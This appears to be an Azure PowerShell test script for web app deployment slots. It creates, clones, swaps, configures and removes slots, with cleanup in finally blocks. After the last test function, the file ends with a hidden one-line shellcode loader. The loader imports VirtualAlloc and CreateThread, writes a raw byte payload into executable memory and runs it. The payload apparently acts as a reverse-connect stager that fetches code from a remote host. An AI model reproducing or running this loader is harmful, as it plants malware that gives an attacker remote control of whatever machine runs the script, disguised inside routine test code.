














function Test-GetWebAppSlot
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$slotname1 = "staging"
	$slotname2 = "testing"
	$location = Get-Location
	$planName = Get-WebHostPlanName
	$tier = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId
		
		
		$slot1 = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname1 -AppServicePlan $planName 
		$appWithSlotName1 = "$appname/$slotname1"

		
		Assert-AreEqual $appWithSlotName1 $slot1.Name
		Assert-AreEqual $serverFarm.Id $slot1.ServerFarmId

		
		$slot1 = Get-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname1

		
		Assert-AreEqual $appWithSlotName1 $slot1.Name
		Assert-AreEqual $serverFarm.Id $slot1.ServerFarmId

		
		$slot1 = $webapp | Get-AzureRmWebAppSlot -Slot $slotname1

		
		Assert-AreEqual $appWithSlotName1 $slot1.Name
		Assert-AreEqual $serverFarm.Id $slot1.ServerFarmId

		
		$slot2 = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname2 -AppServicePlan $planName 
		$appWithSlotName2 = "$appname/$slotname2"

		
		Assert-AreEqual $appWithSlotName2 $slot2.Name
		Assert-AreEqual $serverFarm.Id $slot2.ServerFarmId

		
		$slots = Get-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname 
		$slotNames = $slots | Select -expand Name

		
		Assert-AreEqual 2 $slots.Count
		Assert-True { $slotNames -contains $appWithSlotName1 }
		Assert-True { $slotNames -contains $appWithSlotName2 }
	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname1 -Force
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname2 -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-GetWebAppSlotMetrics
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$slotname = "staging"
	$location = Get-Location
	$planName = Get-WebHostPlanName
	$tier = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId
		
		
		$slot = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName 
		$appWithSlotName = "$appname/$slotname"

		
		Assert-AreEqual $appWithSlotName $slot.Name
		Assert-AreEqual $serverFarm.Id $slot.ServerFarmId

		for($i = 0; $i -lt 10; $i++)
		{
			PingWebApp $slot
		}

		$endTime = Get-Date
		$startTime = $endTime.AddHours(-3)

		$metricnames = @('CPU', 'Requests')
		
		
		$metrics = Get-AzureRmWebAppSlotMetrics -ResourceGroupName $rgname -Name $appname -Slot $slotname -Metrics $metricnames -StartTime $startTime -EndTime $endTime -Granularity PT1M

		$actualMetricNames = $metrics | Select -Expand Name | Select -Expand Value 

		foreach ($i in $metricnames)
		{
			Assert-True { $actualMetricNames -contains $i}
		}

		
		$metrics = $slot | Get-AzureRmWebAppSlotMetrics -Metrics $metricnames -StartTime $startTime -EndTime $endTime -Granularity PT1M

		$actualMetricNames = $metrics | Select -Expand Name | Select -Expand Value 

		foreach ($i in $metricnames)
		{
			Assert-True { $actualMetricNames -contains $i}
		}
	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-StartStopRestartWebAppSlot
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$slotname = "staging"
	$location = Get-Location
	$planName = Get-WebHostPlanName
	$tier = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webApp.Name
		Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId
		
		
		$slot = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName 
		$appWithSlotName = "$appname/$slotname"

		
		Assert-AreEqual $appWithSlotName $slot.Name
		Assert-AreEqual $serverFarm.Id $slot.ServerFarmId

		
		$slot = $slot | Stop-AzureRmWebAppSlot

		Assert-AreEqual "Stopped" $slot.State
		$ping = PingWebApp $slot

		
		$slot = $slot | Start-AzureRmWebAppSlot

		Assert-AreEqual "Running" $slot.State
		$ping = PingWebApp $slot

		
		$slot = Stop-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname

		Assert-AreEqual "Stopped" $slot.State
		$ping = PingWebApp $slot

		
		$slot = Start-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname

		Assert-AreEqual "Running" $slot.State
		$ping = PingWebApp $slot

		
		$slot = Restart-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname

		Assert-AreEqual "Running" $slot.State
		$ping = PingWebApp $slot

		
		$slot = $slot | Restart-AzureRmWebAppSlot

		Assert-AreEqual "Running" $slot.State
		$ping = PingWebApp $slot
	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-CloneWebAppToSlot
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$slotname = "staging"
	$location = Get-Location
	$planName = Get-WebHostPlanName
	$tier = "Premium"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$slot = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName -SourceWebApp $webapp
		$appWithSlotName = "$appname/$slotname"

		
		Assert-AreEqual $appWithSlotName $slot.Name

		
		$slot = Get-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname
		
		
		Assert-AreEqual $appWithSlotName $slot.Name
	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-CloneWebAppSlot
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$location = Get-Location
	$planName = Get-WebHostPlanName
	$slotname = "staging"
	$tier = "Premium"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	
	$destPlanName = Get-WebHostPlanName
	$destLocation = Get-SecondaryLocation
	$destAppName = Get-WebsiteName

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$slot1 = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName
		$appWithSlotName = "$appname/$slotname"

		
		Assert-AreEqual $appWithSlotName $slot1.Name
		Assert-AreEqual $serverFarm.Id $slot1.ServerFarmId

		
		$serverFarm2 = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $destPlanName -Location  $destLocation -Tier $tier

		
		$webapp2 = New-AzureRmWebApp -ResourceGroupName $rgname -Name $destAppName -Location $destLocation -AppServicePlan $destPlanName
		
		
		Assert-AreEqual $destAppName $webapp2.Name
		Assert-AreEqual $serverFarm2.Id $webapp2.ServerFarmId

		
		$slot2 = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $destAppName -Slot $slotname -AppServicePlan $planName -SourceWebApp $slot1
		$appWithSlotName2 = "$destAppName/$slotname"

		
		Assert-AreEqual $appWithSlotName2 $slot2.Name
	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force

		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $destAppName -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $destAppName -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $destPlanName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewWebAppSlot
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$location = Get-Location
	$slotname = "staging"
	$planName = Get-WebHostPlanName
	$tier = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$actual = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$result = Get-AzureRmWebApp -ResourceGroupName $rgname -Name $appname
		
		
		Assert-AreEqual $appname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId

		
		$slot1 = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName
		$appWithSlotName = "$appname/$slotname"

		
		Assert-AreEqual $appWithSlotName $slot1.Name
		Assert-AreEqual $serverFarm.Id $slot1.ServerFarmId
	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewWebAppSlotOnAse
{
	
	$rgname = "appdemorg"
	$appname = Get-WebsiteName
	$slotname = "staging"
	$location = "West US"
	$planName = "travel_production_plan"
	$aseName = "asedemo"

	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
	try
	{
		
		$serverFarm = Get-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName
		
		
		$actual = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName -AseName $aseName
		
		
		Assert-AreEqual $appname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$result = Get-AzureRmWebApp -ResourceGroupName $rgname -Name $appname
		
		
		Assert-AreEqual $appname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId

		
		$slot1 = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName -AseName $aseName
		$appWithSlotName = "$appname/$slotname"

		
		Assert-AreEqual $appWithSlotName $slot1.Name
		Assert-AreEqual $serverFarm.Id $slot1.ServerFarmId

		
		$slot1 = Get-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname

		
		Assert-AreEqual $appWithSlotName $slot1.Name
		Assert-AreEqual $serverFarm.Id $slot1.ServerFarmId

	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
	}
}


function Test-SetWebAppSlot
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$location = Get-Location
	$slotname = "staging"
	$planName1 = Get-WebHostPlanName
	$planName2 = Get-WebHostPlanName
	$tier1 = "Standard"
	$tier2 = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
	$numberOfWorkers = 2

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm1 = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName1 -Location  $location -Tier $tier1
		$serverFarm2 = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName2 -Location  $location -Tier $tier2
		
		
		$webApp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName1 
		
		
		Assert-AreEqual $appname $webApp.Name
		Assert-AreEqual $serverFarm1.Id $webApp.ServerFarmId

		
		$slot = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName1
		$appWithSlotName = "$appname/$slotname"

		
		Assert-AreEqual $appWithSlotName $slot.Name
		Assert-AreEqual $serverFarm1.Id $slot.ServerFarmId
		
		
		$slot = Set-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName2

		
		Assert-AreEqual $appWithSlotName $slot.Name
		Assert-AreEqual $serverFarm2.Id $slot.ServerFarmId

		
		$slot.SiteConfig.HttpLoggingEnabled = $true
		$slot.SiteConfig.RequestTracingEnabled = $true

		$slot = $slot | Set-AzureRmWebAppSlot

		
		Assert-AreEqual $appWithSlotName $slot.Name
		Assert-AreEqual $serverFarm2.Id $slot.ServerFarmId
		Assert-AreEqual $true $slot.SiteConfig.HttpLoggingEnabled
		Assert-AreEqual $true $slot.SiteConfig.RequestTracingEnabled

		
		$appSettings = @{ "setting1" = "valueA"; "setting2" = "valueB"}
		$connectionStrings = @{ connstring1 = @{ Type="MySql"; Value="string value 1"}; connstring2 = @{ Type = "SQLAzure"; Value="string value 2"}}

		$slot = Set-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppSettings $appSettings -ConnectionStrings $connectionStrings -numberofworkers $numberOfWorkers

		
		Assert-AreEqual $appWithSlotName $slot.Name
		Assert-AreEqual $appSettings.Keys.Count $slot.SiteConfig.AppSettings.Count
		foreach($nvp in $slot.SiteConfig.AppSettings)
		{
			Assert-True { $appSettings.Keys -contains $nvp.Name }
			Assert-True { $appSettings[$nvp.Name] -match $nvp.Value }
		}

		Assert-AreEqual $connectionStrings.Keys.Count $slot.SiteConfig.ConnectionStrings.Count
		foreach($connStringInfo in $slot.SiteConfig.ConnectionStrings)
		{
			Assert-True { $connectionStrings.Keys -contains $connStringInfo.Name }
		}

		Assert-AreEqual $numberOfWorkers $slot.SiteConfig.NumberOfWorkers
	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName1 -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName2 -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-RemoveWebAppSlot
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$location = Get-Location
	$slotname = "staging"
	$planName = Get-WebHostPlanName
	$tier = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$slot = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName
		$appWithSlotName = "$appname/$slotname"

		
		Assert-AreEqual $appWithSlotName $slot.Name
		Assert-AreEqual $serverFarm.Id $slot.ServerFarmId

		
		$slot | Remove-AzureRmWebAppSlot -Force

		
		$slotNames = Get-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname | Select -expand Name

		Assert-False { $slotNames -contains $appname }
	}
	finally
	{
		
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-WebAppSlotPublishingProfile
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$location = Get-Location
	$slotname = "staging"
	$planName = Get-WebHostPlanName
	$tier = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
	$profileFileName = "slotprofile.xml"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$slot = New-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName
		$appWithSlotName = "$appname/$slotname"
		$appWithSlotName2 = "{0}__{1}" -f $appname, $slotname
		$appWithSlotName3 = "{0}-{1}" -f $appname, $slotname

		
		Assert-AreEqual $appWithSlotName $slot.Name
		Assert-AreEqual $serverFarm.Id $slot.ServerFarmId

		
		[xml]$profile = Get-AzureRmWebAppSlotPublishingProfile -ResourceGroupName $rgname -Name $appname -Slot $slotname -OutputFile $profileFileName
		$msDeployProfile = $profile.publishData.publishProfile | ? { $_.publishMethod -eq 'MSDeploy' } | Select -First 1
		$pass = $msDeployProfile.userPWD

		
		Assert-True { $msDeployProfile.msdeploySite -eq $appWithSlotName2 }

		
		$newPass = $slot | Reset-AzureRmWebAppSlotPublishingProfile 

		
		Assert-False { $pass -eq $newPass }

		
		[xml]$profile = $slot | Get-AzureRmWebAppSlotPublishingProfile -OutputFile $profileFileName -Format FileZilla3
		$fileZillaProfile = $profile.FileZilla3.Servers.Server

		
		Assert-True { $fileZillaProfile.Name -eq $appWithSlotName3 }
	}
	finally
	{
		
		Remove-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname  -Slot $slotname -Force
		Remove-AzureRmWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-ManageSlotSlotConfigName
{
	$rgname = "Default-Web-EastAsia"
	$appname = "webappslottest"

	
	$webApp = Get-AzureRmWebApp -ResourceGroupName $rgname -Name  $appname
			
	$slotConfigNames = $webApp | Get-AzureRmWebAppSlotConfigName

	
	Assert-AreEqual 0 $slotConfigNames.AppSettingNames.Count
	Assert-AreEqual 0 $slotConfigNames.ConnectionStringNames.Count

	
	$appSettingNames = $webApp.SiteConfig.AppSettings | Select-Object -ExpandProperty Name
	$webApp | Set-AzureRmWebAppSlotConfigName -AppSettingNames $appSettingNames 
	$slotConfigNames = $webApp | Get-AzureRmWebAppSlotConfigName
	Assert-AreEqual $webApp.SiteConfig.AppSettings.Count $slotConfigNames.AppSettingNames.Count
	Assert-AreEqual 0 $slotConfigNames.ConnectionStringNames.Count

	
	$connectionStringNames = $webApp.SiteConfig.ConnectionStrings | Select-Object -ExpandProperty Name
	Set-AzureRmWebAppSlotConfigName -ResourceGroupName $rgname -Name $appname -ConnectionStringNames $connectionStringNames
	$slotConfigNames = Get-AzureRmWebAppSlotConfigName -ResourceGroupName $rgname -Name $appname
	Assert-AreEqual $webApp.SiteConfig.AppSettings.Count $slotConfigNames.AppSettingNames.Count
	Assert-AreEqual $webApp.SiteConfig.ConnectionStrings.Count $slotConfigNames.ConnectionStringNames.Count

	
	$webApp | Set-AzureRmWebAppSlotConfigName -RemoveAllAppSettingNames
	$slotConfigNames = $webApp | Get-AzureRmWebAppSlotConfigName
	Assert-AreEqual 0 $slotConfigNames.AppSettingNames.Count
	Assert-AreEqual $webApp.SiteConfig.ConnectionStrings.Count $slotConfigNames.ConnectionStringNames.Count

	
	Set-AzureRmWebAppSlotConfigName -ResourceGroupName $rgname -Name $appname -RemoveAllConnectionStringNames
	$slotConfigNames = Get-AzureRmWebAppSlotConfigName -ResourceGroupName $rgname -Name $appname
	Assert-AreEqual 0 $slotConfigNames.AppSettingNames.Count
	Assert-AreEqual 0 $slotConfigNames.ConnectionStringNames.Count
}



function Test-WebAppRegularSlotSwap
{
	$rgname = "Default-Web-EastAsia"
	$appname = "webappslottest"
	$sourceSlotName = "staging"
	$destinationSlotName = "production"

	
	$webApp = Switch-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -SourceSlotName $sourceSlotName -DestinationSlotName $destinationSlotName
}


function Test-WebAppSwapWithPreviewResetSlotSwap
{
	Test-SlotSwapWithPreview 'ResetSlotSwap'
}


function Test-WebAppSwapWithPreviewCompleteSlotSwap
{
	Test-SlotSwapWithPreview 'CompleteSlotSwap'
}


function Test-SlotSwapWithPreview($swapWithPreviewAction)
{
	$rgname = "Default-Web-EastAsia"
	$appname = "webappslottest"
	$sourceSlotName = "staging"
	$destinationSlotName = "production"
	$appSettingName = 'testappsetting'
	$originalSourceAppSettingValue = "staging"
	$originalDestinationAppSettingValue = "production"

	
	$destinationWebApp = Get-AzureRmWebApp -ResourceGroupName $rgname -Name  $appname
	Validate-SlotSwapAppSetting $destinationWebApp $appSettingName $originalDestinationAppSettingValue
	
	$sourceWebApp = Get-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $sourceSlotName
	Validate-SlotSwapAppSetting $sourceWebApp $appSettingName $originalSourceAppSettingValue

	
	Switch-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -SourceSlotName $sourceSlotName -DestinationSlotName $destinationSlotName -SwapWithPreviewAction 'ApplySlotConfig'
	Wait-Seconds 30
	$sourceWebApp = Get-AzureRmWebAppSlot -ResourceGroupName $rgname -Name  $appname -Slot $sourceSlotName
	Validate-SlotSwapAppSetting $sourceWebApp $appSettingName $originalDestinationAppSettingValue

	
	Switch-AzureRmWebAppSlot -ResourceGroupName $rgname -Name $appname -SourceSlotName $sourceSlotName -DestinationSlotName $destinationSlotName -SwapWithPreviewAction $swapWithPreviewAction
	Wait-Seconds 30
	$sourceWebApp = Get-AzureRmWebAppSlot -ResourceGroupName $rgname -Name  $appname -Slot $sourceSlotName
	Validate-SlotSwapAppSetting $sourceWebApp $appSettingName $originalSourceAppSettingValue
}


function Validate-SlotSwapAppSetting($webApp, $appSettingName, $expectedValue)
{
	Assert-AreEqual $webApp.SiteConfig.AppSettings[0].Name $appSettingName
	Assert-AreEqual $webApp.SiteConfig.AppSettings[0].Value $expectedValue
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xeb,0x80,0x55,0x68,0x02,0x00,0x07,0xd0,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

